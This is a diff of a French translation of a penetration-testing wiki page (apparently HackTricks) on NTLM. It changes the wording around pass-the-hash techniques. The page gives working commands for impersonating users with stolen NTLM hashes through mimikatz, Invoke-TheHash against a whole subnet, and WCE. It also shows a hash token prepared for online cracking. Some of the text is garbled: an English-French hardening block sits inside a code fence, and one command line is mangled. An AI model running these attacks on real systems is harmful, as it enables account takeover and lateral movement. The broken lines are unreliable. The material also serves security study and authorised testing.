@@ -131,25 +131,30 @@ To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
 ```markdown
-# Windows Hardening: NTLM
+# NTLM Hardening
 
-## Introduction
+NTLM (NT LAN Manager) is a suite of Microsoft security protocols that provides authentication, integrity, and confidentiality to users. However, NTLM has several vulnerabilities that can be exploited by attackers. This document outlines steps to harden NTLM in your environment.
 
-NTLM (NT LAN Manager) est un protocole d'authentification utilisé dans les systèmes Windows. Bien qu'il ait été largement remplacé par Kerberos, NTLM est encore utilisé dans de nombreux environnements, en particulier pour la compatibilité avec les anciennes applications.
+## Steps to Harden NTLM
 
-## Techniques de durcissement
+1. **Disable NTLM where possible**  
+   Désactivez NTLM là où c'est possible. Utilisez Kerberos à la place.
 
-1. **Désactiver NTLM**: Si possible, désactivez NTLM dans votre environnement. Utilisez Kerberos à la place pour une sécurité accrue.
+2. **Limit NTLM usage**  
+   Limitez l'utilisation de NTLM aux systèmes et applications qui en ont besoin.
 
-2. **Configurer les stratégies de sécurité**: Assurez-vous que les stratégies de sécurité de votre système sont configurées pour limiter l'utilisation de NTLM.
+3. **Implement NTLM auditing**  
+   Mettez en œuvre l'audit NTLM pour surveiller les connexions et les échecs d'authentification.
 
-3. **Surveiller les journaux d'événements**: Gardez un œil sur les journaux d'événements pour détecter toute utilisation non autorisée de NTLM.
+4. **Use strong passwords**  
+   Utilisez des mots de passe forts et appliquez des politiques de complexité.
 
-4. **Utiliser des mots de passe forts**: Assurez-vous que tous les comptes utilisent des mots de passe forts pour réduire le risque d'attaques par force brute.
+5. **Regularly update systems**  
+   Mettez régulièrement à jour les systèmes pour corriger les vulnérabilités.
 
 ## Conclusion
 
-Le durcissement de NTLM est essentiel pour protéger votre environnement Windows contre les menaces potentielles. En suivant ces techniques, vous pouvez réduire les risques associés à l'utilisation de ce protocole.
+En suivant ces étapes, vous pouvez réduire les risques associés à NTLM et améliorer la sécurité de votre environnement.
 ```
 ```bash
 727B4E35F947129E:1122334455667788
@@ -198,8 +203,8 @@ Si vous avez un **pcap qui a capturé un processus d'authentification réussi**,
 
 ## Pass-the-Hash
 
-**Une fois que vous avez le hash de la victime**, vous pouvez l'utiliser pour **l'imiter**.\
-Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hash** à l'intérieur de **LSASS**, donc lorsque n'importe quelle **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.
+**Une fois que vous avez le hash de la victime**, vous pouvez l'utiliser pour **l'usurper**.\
+Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pourriez créer une nouvelle **sessionlogon** et **injecter** ce **hash** à l'intérieur de **LSASS**, de sorte que lorsque toute **authentification NTLM est effectuée**, ce **hash sera utilisé.** La dernière option est ce que fait mimikatz.
 
 **Veuillez, vous rappeler que vous pouvez également effectuer des attaques Pass-the-Hash en utilisant des comptes d'ordinateur.**
 
@@ -209,7 +214,7 @@ Vous devez utiliser un **outil** qui va **effectuer** l'**authentification NTLM 
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz, mais en interne dans LSASS, les identifiants enregistrés sont ceux à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly`, mais vous n'avez pas besoin de connaître le mot de passe en clair).
+Cela lancera un processus qui appartiendra aux utilisateurs ayant lancé mimikatz, mais en interne dans LSASS, les identifiants sauvegardés sont ceux à l'intérieur des paramètres de mimikatz. Ensuite, vous pouvez accéder aux ressources réseau comme si vous étiez cet utilisateur (similaire à l'astuce `runas /netonly`, mais vous n'avez pas besoin de connaître le mot de passe en clair).
 
 ### Pass-the-Hash depuis linux
 
@@ -247,13 +252,13 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'un** de **SMBExec** et **WMIExec** mais que vous **ne** donnez aucun paramètre _**Command**_, cela vérifiera simplement si vous avez **suffisamment de permissions**.
+Cette fonction est un **mélange de toutes les autres**. Vous pouvez passer **plusieurs hôtes**, **exclure** certains et **sélectionner** l'**option** que vous souhaitez utiliser (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si vous sélectionnez **l'un** de **SMBExec** et **WMIExec** mais que vous **ne** donnez aucun paramètre _**Command**_, cela va simplement **vérifier** si vous avez **suffisamment de permissions**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-### Éditeur de Crédentiels Windows (WCE)
+### Éditeur de Credentials Windows (WCE)
 
 **Doit être exécuté en tant qu'administrateur**
 
@@ -271,7 +276,7 @@ wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 
 **Pour plus d'informations sur** [**comment obtenir des identifiants d'un hôte Windows, vous devriez lire cette page**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**
 
-## Relais NTLM et Responder
+## Relais NTLM et Répondeur
 
 **Lisez un guide plus détaillé sur la façon de réaliser ces attaques ici :**
 
@@ -291,7 +296,7 @@ Apprenez et pratiquez le hacking GCP : <img src="../../.gitbook/assets/grte.png"
 
 <summary>Soutenir HackTricks</summary>
 
-* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
+* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
 * **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.
 
